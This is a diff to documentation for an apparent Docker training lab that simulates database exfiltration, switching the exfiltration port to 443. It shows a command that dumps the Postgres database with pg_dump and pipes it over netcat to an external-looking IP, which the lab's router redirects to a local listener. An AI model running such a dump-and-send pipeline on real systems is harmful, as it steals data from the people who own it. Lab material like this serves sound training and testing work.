@@ -8,11 +8,11 @@ The data exfiltration simulation is now **automatically configured** when you ru
 
 ```bash
 # Test connection
-docker exec lab_server nc -zv 137.184.126.86 666
+docker exec lab_server nc -zv 137.184.126.86 443
 
 # Exfiltrate database
 docker exec lab_server su - postgres -c \
-  'pg_dump -U postgres labdb | nc -w 10 137.184.126.86 666'
+  'pg_dump -U postgres labdb | nc -w 10 137.184.126.86 443'
 
 # Retrieve captured data
 docker cp lab_router:/tmp/exfil/labdb_dump.sql ./labdb_dump.sql
@@ -25,11 +25,11 @@ docker cp lab_router:/tmp/exfil/labdb_dump.sql ./labdb_dump.sql
 - **Auto-configured on `make up`**
 
 ### 2. Router DNAT (`images/router/entrypoint.sh`)
-- Redirects `137.184.126.86:8000` → `172.31.0.1:8000`
+- Redirects `137.184.126.86:443` → `172.31.0.1:443`
 - **Auto-configured on `make up`**
 
 ### 3. Router Listener (`images/router/entrypoint.sh`)
-- Listens on port 8000 for incoming connections
+- Listens on port 443 for incoming connections
 - **Auto-started on `make up`**
 
 ## Files Created/Modified
@@ -50,8 +50,8 @@ docker cp lab_router:/tmp/exfil/labdb_dump.sql ./labdb_dump.sql
 All four components verified working:
 ```
 ✅ Server route: 137.184.126.86 via 172.31.0.1
-✅ Router DNAT: DNAT tcp dpt:8000 to:172.31.0.1:8000
-✅ Router listener: nc listening on port 8000
+✅ Router DNAT: DNAT tcp dpt:443 to:172.31.0.1:443
+✅ Router listener: nc listening on port 443
 ✅ Connection test: succeeded
 ```
 
